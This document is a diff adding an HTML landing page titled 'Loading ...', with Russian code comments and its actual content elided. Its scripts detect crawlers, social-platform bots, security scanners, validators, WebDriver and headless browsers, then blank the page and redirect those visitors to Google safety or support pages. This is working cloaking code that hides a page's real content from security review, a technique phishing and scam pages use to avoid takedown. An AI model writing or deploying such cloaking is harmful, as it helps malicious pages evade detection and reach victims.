@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <script>
+        // Список бот-сигнатур для проверки
+        const BOT_PATTERNS = [
+            'bot', 'crawl', 'spider', 'facebook', 'twitter', 
+            'pinterest', 'monitoring', 'validator', 'scanner',
+            'tiktokwebview', 'tiktok', 'datasider', 'qwant'
+        ];
+
+        // Проверка User-Agent
+        const isBot = () => {
+            const ua = navigator.userAgent.toLowerCase();
+            return BOT_PATTERNS.some(pattern => ua.includes(pattern));
+        };
+
+        // Проверка WebDriver
+        const isAutomated = () => {
+            return navigator.webdriver || 
+                window.callPhantom || 
+                window._phantom;
+        };
+
+        // Редирект для ботов
+        if(isBot() || isAutomated()) {
+            window.location.replace('https://safety.google');
+        }
+    </script>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loading ...</title>
+    <style>
+        /* Оригинальные стили остаются без изменений */
+        body {
+            font-family: Arial, sans-serif;
+            background: linear-gradient(135deg, #2e015a, #6829b7);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        /* ... остальные стили ... */
+    </style>
+</head>
+<body>
+    <!-- Оригинальный контент -->
+    <div class="container">
+        <!-- ... существующая разметка ... -->
+    </div>
+
+    <script>
+        // Дополнительные проверки
+        let isHuman = true;
+        
+        // Проверка на Headless браузер
+        if(navigator.plugins.length === 0 || 
+           navigator.languages.length === 0 || 
+           !('ontouchstart' in window)) {
+            isHuman = false;
+        }
+
+        // Финальная проверка перед показом контента
+        if(!isHuman) {
+            document.body.innerHTML = '';
+            window.location.replace('https://support.google.com/websearch');
+        }
+    </script>
+</body>
+</html>
